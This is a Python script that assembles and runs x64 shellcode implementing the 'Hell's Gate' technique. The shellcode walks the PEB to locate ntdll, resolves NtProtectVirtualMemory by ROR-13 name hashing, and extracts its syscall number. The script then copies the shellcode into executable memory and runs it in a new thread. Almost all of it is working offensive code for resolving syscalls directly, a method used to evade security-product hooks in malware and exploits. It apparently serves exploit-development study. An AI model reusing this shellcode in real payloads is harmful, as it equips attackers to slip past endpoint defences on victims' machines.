#!/usr/bin/python
#
# Subject:      Hell's Gate Test to resolve the Syscall Number of NtProtectVirtualMemory
# Description:  Assembly implementation of Milton Valencia's analysis: https://wetw0rk.github.io/posts/ezekielswheel/ezekielswheel
# Ported by:    hvictor

import socket
import sys
from struct import pack
from ctypes import *
from keystone import *


hg = (
'''
find_ntdll:
    xor rax, rax; 
    mov rax, gs:[rax + 0x60];                   # RAX = address of the PEB
    mov rax, [rax + 0x18];                      # RAX = address of _PEB_LDR_DATA
    mov rax, [rax + 0x20];                      # RAX = address of first _LIST_ENTRY of InMemoryOrderModuleList
    mov r8, rax;                                # R8 = address of current _LIST_ENTRY of InMemoryOrderModuleList

loop_next_list_entry:
    sub rax, 16;                                # RAX = address of the belonging _LDR_DATA_TABLE_ENTRY
    movzx cx, [rax + 0x58];                     # RCX = length of BaseDllName.Buffer in bytes (1 UNICODE char = 2 bytes)
    mov rsi, [rax + 0x58 + 8];                  # RSI = address of UNICODE string BaseDllName.Buffer
    mov r9, [rax + 0x30];                       # R9 = DllBase

compute_dll_name_hash:
    xor rax, rax;                               # EAX = 0
    cdq;                                        # If the MSB of EAX = 1: EDX = 0x11111111
                                                # If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX
                                                # In this case, EDX = 0x00000000 because EAX = 0x00000000

loop_compute_dll_name_hash:
    ror edx, 0xd;                               # Right-shift EDX of 13 bits
    add edx, eax;                               # EDX += current EAX value
    lodsb;                                      # Load the byte pointed by RSI into AL
    inc rsi;                                    # Discard the second byte of the UNICODE character (00)
    test al, al;                                # Test if the NULL terminator of the module name has been reached
    jnz loop_compute_dll_name_hash;             # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                                # Else, perform the next iteration of the hash-computation algorithm
                                                # At this point, EDX contains the computed hash of the current DLL name

    mov rax, [r8]                               # RAX = address of the next _LIST_ENTRY (current _LIST_ENTRY's Flink)
    cmp edx, 0xcef6e822;                        # Compare with Hash of "ntdll.dll"
    jnz loop_next_list_entry

calc_vma_ntdll_eat:
    xor rax, rax;
    mov eax, [r9 + 0x3c];                       # RAX = e_lfanew
    mov eax, [r9 + rax + 0x88];                 # EAX = RVA of ntdll's EAT
    add rax, r9;                                # RAX = VMA of ntdll's EAT
    
    xor rcx, rcx;
    xor rbp, rbp;
    xor rsi, rsi;
    xor r11, r11;
    xor rdi, rdi;
    mov ecx, [rax + 24];                        # ECX = Number Of Names -> will be used to index AddressOfNames
    mov ebp, [rax + 32];                        # EBP = RVA of AddressOfNames
    add rbp, r9;                                # RBP = VMA of AddressOfNames
    mov esi, [rax + 28];                        # ESI = RVA of AddressOfFunctions
    mov r11, rsi;
    add r11, r9;                                # R11 = VMA of AddressOfFunctions
    mov edi, [rax + 36];                        # EDI = RVA of AddressOfNameOrdinals
    add rdi, r9;                                # RDI = VMA of AddressOfNameOrdinals

loop_over_ntdll_names:
    xor rsi, rsi;
    dec ecx;                                    # Decrement the index for accessing AddressOfNames
    mov esi, [rbp + 4*rcx];                     # ESI = RVA of the (ECX + 1)-th name of ntdll
    add rsi, r9;                                # RSI = VMA of the (ECX + 1)-th name of ntdll
    
compute_symbol_hash:
    xor rax, rax;                               # EAX = 0
    cdq;

loop_compute_symbol_hash:
    ror edx, 0xd;                               # Right-shift EDX of 13 bits
    add edx, eax;                               # EDX += current EAX value
    lodsb;                                      # Load the byte pointed by RSI into AL
    test al, al;                                # Test if the NULL terminator of the symbol name has been reached
    jnz loop_compute_symbol_hash;               # If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                                # Else, perform the next iteration of the hash-computation algorithm
                                                # At this point, EDX contains the computed hash of the current symbol
    cmp edx, 0x8c394d89                         # Hash of NtProtectVirtualMemory
    jnz loop_over_ntdll_names;

    mov cx, [rdi + 2*rcx];                      # RCX = ordinal
    xor eax, eax;
    mov eax, [r11 + 4*rcx];                     # EAX = AddressOfFunctions[ordinal] = RVA of NtProtectVirtualMemory
    add rax, r9;                                # RAX = VMA of NtProtectVirtualMemory

    dec rax;                                    # Position the pointer 1 byte before the start of function's code
loop_align_with_syscall_begin:                  # Find the beginning of the syscall: mov r10, rcx ; mov eax, <syscall number> ; 
    inc rax;
    mov rdx, [rax];                             # Read 8 bytes from the pointer
    cmp edx, 0xb8d18b4c;                        # Check whether the code at the pointer starts with "mov r10, rcx ; mov eax, <syscall number>"
    jnz loop_align_with_syscall_begin;
    shr rdx, 32;                                # EDX = 00 00 <syscall number (2 bytes)>
    ror edx, 16;                                # EDX = <syscall number (2 bytes)> 00 00
    cmp dx, 0x0000;
    jnz loop_align_with_syscall_begin;
    shr rdx, 16;                                # RDX = syscall number
    
    int3;                                       # WARNING: REMOVE THIS INSTRUCTION WHEN NOT DEBUGGING!
    
'''
)

ks = Ks(KS_ARCH_X86, KS_MODE_64)

# Generation of syscall-based Egghunter
encoding, count = ks.asm(hg)
hg_hexstr = ""
for dec in encoding: 
  hg_hexstr += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print(f"Hell's Gate Shellcode: {hg_hexstr}")

sh = b""
for e in encoding:
    sh += pack("B", e)
shellcode_hg = bytearray(sh)

# Allocate executable memory for the Hell's Gate shellcode
memory_hg = windll.kernel32.VirtualAlloc(0x10000000, len(shellcode_hg), 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

if not memory_hg:
    raise RuntimeError("VirtualAlloc failed!")

print(f"Allocated {len(shellcode_hg)} bytes of shellcode memory at {c_uint64(memory_hg).value:#018x}")

# Copy shellcode in the allocated read/write memory
buf = (c_char * len(shellcode_hg)).from_buffer_copy(shellcode_hg)
windll.kernel32.RtlMoveMemory(memory_hg, buf, len(shellcode_hg))

input("\n[?] Press Enter to execute the shellcode: ")

# Execute the shellcode in a new thread
ht = windll.kernel32.CreateThread(
    None, 0, c_void_p(memory_hg), None, 0, pointer(c_int(0))
)

if not ht:
    raise RuntimeError("CreateThread failed!")

# Wait for thread termination
windll.kernel32.WaitForSingleObject(ht, -1)